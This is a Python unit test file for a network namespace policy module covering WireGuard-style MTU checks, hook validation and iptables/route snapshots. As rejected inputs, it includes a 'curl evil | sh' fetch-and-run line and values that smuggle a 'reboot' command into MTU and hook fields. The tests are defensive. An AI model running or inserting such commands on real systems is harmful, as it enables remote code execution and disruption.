"""Typed namespace policy and MTU fixtures; never invokes networking tools."""
import unittest
from policy import mtu, validate_hooks, namespace_snapshot, standard_filter

INTERFACE = {'Address': '10.8.1.1/24', 'MTU': '1280'}


class PolicyTests(unittest.TestCase):
    def test_small_mtu_preserves_large_ipv4_packet_budget(self):
        # A 1252-byte ICMP payload + IPv4/ICMP headers exactly fills MTU 1280.
        payload = bytes(range(256)) * 4 + bytes(228)
        self.assertEqual(1280, len(payload) + 28)
        self.assertEqual(1280, mtu(INTERFACE['MTU']))
        for invalid in ('575', '9001', '1280; reboot', '-1'):
            with self.assertRaises(ValueError): mtu(invalid)

    def test_standard_hooks_reproduced_arbitrary_shell_rejected(self):
        validate_hooks({**INTERFACE, 'PostUp': 'iptables -A FORWARD -i %i -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE',
                        'PostDown': 'iptables -D FORWARD -i %i -j ACCEPT'}, 'wg0')
        for hook in ('curl evil | sh', 'ip rule add to 1.2.3.0/24 lookup 100',
                     'iptables -A FORWARD -i %i -j ACCEPT && reboot'):
            with self.assertRaises(ValueError): validate_hooks({**INTERFACE, 'PostUp': hook}, 'wg0')

    def run_fixture(self, *args):
        if 'link' in args: return b'5: wg0: <UP> mtu 1280 state UNKNOWN\n'
        if 'rule' in args: return b'0: from all lookup local\n32766: from all lookup main\n32767: from all lookup default\n'
        if 'iptables' in args:
            table = args[args.index('-t') + 1]
            if table == 'filter': return ('-P INPUT ACCEPT\n-P FORWARD ACCEPT\n-P OUTPUT ACCEPT\n' + '\n'.join(standard_filter('wg0', '10.8.1.0/24'))).encode()
            if table == 'nat': return b'-P PREROUTING ACCEPT\n-A POSTROUTING -s 10.8.1.0/24 -o eth0 -j MASQUERADE\n'
            return b'-P PREROUTING ACCEPT\n'
        if 'get' in args: return (args[-1] + ' dev ' + ('eth1' if args[-1].startswith('172.29.') else 'eth0')).encode()
        if 'route' in args: return b'default via 172.17.0.1 dev eth0\n10.8.1.0/24 dev wg0 proto kernel scope link src 10.8.1.1\n'
        raise AssertionError(args)

    def test_runtime_mtu_and_effective_rules_observed(self):
        result = namespace_snapshot(self.run_fixture, 'source', INTERFACE, 'wg0')
        self.assertEqual(1280, result['mtu'])
        self.assertEqual('eth1', result['egress']['172.29.172.254'])
        self.assertTrue(all('wg0' not in rule for rule in result['filter']))

    def test_custom_effective_policy_and_mtu_drift_fail_closed(self):
        with self.assertRaises(ValueError): namespace_snapshot(self.run_fixture, 'source', {**INTERFACE, 'MTU': '1420'}, 'wg0')
        def custom(*args):
            if 'rule' in args: return self.run_fixture(*args) + b'100: from all to 1.2.3.0/24 lookup 100\n'
            return self.run_fixture(*args)
        with self.assertRaises(ValueError): namespace_snapshot(custom, 'source', INTERFACE, 'wg0')


if __name__ == '__main__': unittest.main()
